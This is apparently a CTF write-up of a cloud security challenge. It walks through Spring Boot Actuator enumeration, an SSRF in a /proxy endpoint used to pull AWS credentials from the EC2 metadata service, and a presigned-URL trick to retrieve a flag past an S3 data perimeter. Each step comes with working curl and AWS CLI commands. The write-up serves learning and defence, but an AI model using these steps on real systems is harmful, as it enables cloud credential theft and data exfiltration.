

# 🎯 CTF Journal: Perimeter Leak Challenge 

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/wiz-challenge.png?raw=true" alt="Wiz Challenge Banner" width="900"/>
</p>


## 📋 Challenge Context

The “Perimeter Leak” challenge puts us in a realistic scenario: we have access to a jump server and need to extract a flag from an S3 bucket protected by an **AWS data perimeter**. This network protection blocks direct external access, a tough security mechanism! 🛡️

**💭 Scott Piper quote:**
*"AWS data perimeters are a very strong security mitigation, but I wanted to show a way in which things can go wrong using an important feature of AWS that is common in larger applications, but that many do not have experience with."*

## [ ➡️ Here's the link of the challenge ; Have fun!! ](https://www.cloudsecuritychampionship.com/)


---

## 🔍 Phase 1: Initial Reconnaissance

### Discovering the Spring Boot Actuator app

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/proxy%20server%20found-1.png?raw=true" alt="Proxy Server Found" width="1000"/>
</p>

```bash
printenv | grep -i aws
```

**Result:** `INFO_MSG=You've discovered a Spring Boot Actuator application running on AWS: curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com`

**💡 Why this command?**
Looking for AWS environment variables to understand the context. Spring Boot Actuator often exposes sensitive info via its endpoints.

Then we actually used the command given :
```bash
curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com
```

**Result:** `Welcome to the proxy server` 🎯

**💡 Reasoning:**
Basic auth (`ctf:88sPVWyC2P3p`) works and reveals it’s a proxy server — key info for what’s next!

---

## 🕵️ Phase 2: Enumerating Actuator endpoints

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/endpoint-list-4.png?raw=true" alt="Endpoint List" width="1000"/>
</p>


```bash
curl -u ctf:88sPVWyC2P3p "https://challenge01.cloud-champions.com/actuator" | jq
```

**📝 Endpoints discovered:**

* `/actuator/env` ➡️ **Environment variables (jackpot!)**
* `/actuator/mappings` ➡️ **Available routes**
* `/actuator/info`, `/actuator/health`, `/actuator/metrics`…

**💡 Strategy:**
In cloud CTFs, `/actuator/env` often leaks AWS secrets; `/actuator/mappings` shows app features.

---

## 🎯 Phase 3: Extracting the bucket name

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/bucket-name-found-5.png?raw=true" alt="Bucket Name Found" width="1000"/>
</p>

```bash
curl -u ctf:88sPVWyC2P3p https://challenge01.cloud-champions.com/actuator/env | jq
```

**Discovery:** Bucket name `challenge01-470f711` 🎉

**Direct test:**

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/cant-s3-bucket-3.png?raw=true" alt="Can't Access S3 Bucket" width="1000"/>
</p>

```bash
aws s3 ls s3://challenge01-470f711 --no-sign-request
```

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/S3-list-failed-6.png?raw=true" alt="S3 List Failed" width="1000"/>
</p>


**Result:** Nothing… 😔 Bucket exists but denies anonymous requests.

I tried to see if any interesting open files were available within the bucket like index.html or config.json. I wanted to try a "Dictionary attack" with the most common name files. This is a reminder, it's not because you can't **ls** a bucket that you have to give up! 

---

## 🔓 Phase 4: Finding the SSRF vulnerability

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/proxy-predicate-7.1.png?raw=true" alt="Proxy Predicate Discovered" width="1000"/>
</p>

```bash
curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq
```

_As you saw, I used  **| jq** at the end of my commands, because it allows me to read it all clearly and more organised._

**🧩 So, what did we find exactly?**

Turns out /proxy takes a url parameter — and just like that, we control where the server sends requests.
It’s like handing the server a map… and telling it to drive anywhere we want.


**💡 Why is this critical?**
SSRF (Server-Side Request Forgery) + AWS = potential access to EC2 metadata at `169.254.169.254`.

> FYI  _That IP (169.254.169.254)? It’s not random. It’s the internal AWS EC2 metadata endpoint aka a goldmine for credentials if a role is attached._

---

## 🔑 Phase 5: Using SSRF to steal credentials

### Step 1: Get the session token

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/token-found-7.png?raw=true" alt="Token Found" width="1000"/>
</p>

```bash
curl -u ctf:88sPVWyC2P3p -X PUT "https://challenge01.cloud-champions.com/proxy" -d "url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -i
```

**Token received 🎉**

**💡 Explanation:**
AWS IMDSv2 requires a session token to secure metadata access.

### Step 2: Discover IAM role name

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/user-name-found-8.png?raw=true" alt="Username Found" width="1000"/>
</p>


```bash
curl -u ctf:88sPVWyC2P3p "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token:<ADD_YOUR_TOKEN>"
```
> _> You'll have a different token, so add yours in the command._
> 
**Role found:** `challenge01-5592368`

### Step 3: Extract AWS credentials

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/creds-found-9.png?raw=true" alt="Credentials Found" width="1000"/>
</p>


```bash
curl -u ctf:88sPVWyC2P3p "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368" -H "X-aws-ec2-metadata-token: <ADD_YOUR_TOKEN>"
```

**🎉 Credentials obtained:**

* `AccessKeyId`: `ASIAxxxxxxxx`
* `SecretAccessKey`: `6XbC/+2OiIxxxxx`
* `SessionToken`: `IQoJb3JpZ2luX2VjEPT...`

> 💡 When you find an access key ID, it's important to check if it starts by ASIA or AKIA. Indeed, there are 2 types:
> 
> **ASIA** = IAM Role via STS Session Token Service and they expire after a certain amount of time.
> 
> **AKIA** = It's an Access Key ID permanent attached to an IAM User, it won't expire unless you remove it.

---

## ⚙️ Phase 6: Configure AWS environment
<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/export-creds-to-use-10.png?raw=true" alt="Export Credentials to Use" width="1000"/>
</p>

```bash
export AWS_ACCESS_KEY_ID=<Add_AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<Add_SecretAccessKey>
export AWS_SESSION_TOKEN=<Add_SessionToken>
```

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/sts-get-caller-id-11.png?raw=true" alt="STS Get Caller Identity" width="1000"/>
</p>

```
aws sts get-caller-identity
```
➡️ This command verifies your AWS credentials by returning your AWS account ID, user ARN, and user ID.
So basically, it confirms *who* you’re authenticated as.


**✅ Confirmation:** Authenticated as the right role!

---

## 📁 Phase 7: Explore the S3 bucket

Now let's see if we can actually list the Bucket S3 we found earlier :

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/s3-list-ok-12.png?raw=true" alt="S3 List OK" width="1000"/>
</p>


```bash
aws s3 ls s3://challenge01-470f711/
```

**Content discovered:**

* `private/` (folder)
* `hello.txt` (file)


```bash
aws s3 ls s3://challenge01-470f711/private/
```

**File found:** `flag.txt` 🎯

**Direct access attempt:**

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/flag-found-cant-open-13.png?raw=true" alt="Flag Found Can't Open" width="1000"/>
</p>


```bash
aws s3 cp s3://challenge01-470f711/private/flag.txt .
```

**❌ Error 403 Forbidden** — Data perimeter blocks access!

---

## 🧠 Phase 8: Understanding the problem & strategy

### 🔍 Data Perimeter dilemma

**Problem:** We have valid IAM credentials, but the S3 bucket enforces a **network condition** via a VPC Endpoint. AWS CLI requests exit to the public internet, so are blocked.

**SSRF solution:** The SSRF proxy only allows requests to domains containing `amazonaws.com` — perfect! 🎯

### 💡 Strategy: Presigned URLs

**Idea:** Generate a **presigned URL** that embeds access rights in the URL itself, then use SSRF proxy to access it inside the allowed network perimeter.

---

## 🚀 Phase 9: Final exploitation

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/pre-signed-URL-created-14.png?raw=true" alt="Pre-signed URL Created" width="1000"/>
</p>


### Generate presigned URL

```bash
aws s3 presign s3://challenge01-470f711/private/flag.txt --region us-east-1 --expires-in 700
```

### Retrieve flag via SSRF

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/encode-URL-flag-found-15.png?raw=true" alt="Encode URL Flag Found" width="1000"/>
</p>


```bash
curl -G -u ctf:88sPVWyC2P3p "https://challenge01.cloud-champions.com/proxy" --data-urlencode "url=<PRESIGNED_URL>"
```

**💡 Why `curl -G` and `--data-urlencode`?**

* `-G` forces GET with encoded query parameters
* `--data-urlencode` safely encodes special characters (&, =, %) in presigned URL
* `--user` handles Basic auth cleanly

---

## 🏆 Victory!

**🎉 FLAG OBTAINED!**

once you entered it, you get this: 

<p align="center">
  <img src="https://github.com/Kzax01/Wiz-Cloud-Security-Challenges/blob/main/Screenshots/June-2025/certificate-june%202025-1.png?raw=true" alt="Wiz Certificate - June 2025" width="700"/>
</p>

---

## 📚 Lessons learned

**🔐 AWS Security:** AWS Data Perimeters are strong, but presigned URLs can bypass them if not carefully handled.

**🕳️ SSRF + Cloud = Danger:** SSRF in cloud environments is especially risky as it exposes sensitive metadata.

**🛠️ Technical:** Proper URL encoding is critical when passing complex parameters via proxies.

> ### **I Hope it sparked your curiosity as much as it did mine! 🔥**


---


## 💬 Let’s Connect!  
Thank you for visiting my GitHub! 🌸  

Here, I share my **Cloud Security projects** and **AWS learning journey**.  
Looking for **Cloud Computing Security** articles? Check out my **Medium**!  

<p align="center">
  <a href="https://www.linkedin.com/in/kenza-in-the-cloud/" target="_blank">
    <img src="https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
  </a>
  <a href="https://discord.com/users/kzax01" target="_blank">
    <img src="https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
  </a>
  <a href="https://medium.com/@Kenza.In.The.Cloud" target="_blank">
    <img src="https://img.shields.io/badge/Medium-12100E?style=for-the-badge&logo=medium&logoColor=white" alt="Medium">
  </a>
</p>


### ☁️ Let’s build the future of cloud together!  
<p align="center">
  <img src="https://i.pinimg.com/originals/91/1d/91/911d914aaf6194489a3f5626bed2bd3a.gif" width="600" alt="Cool GIF">
</p> 
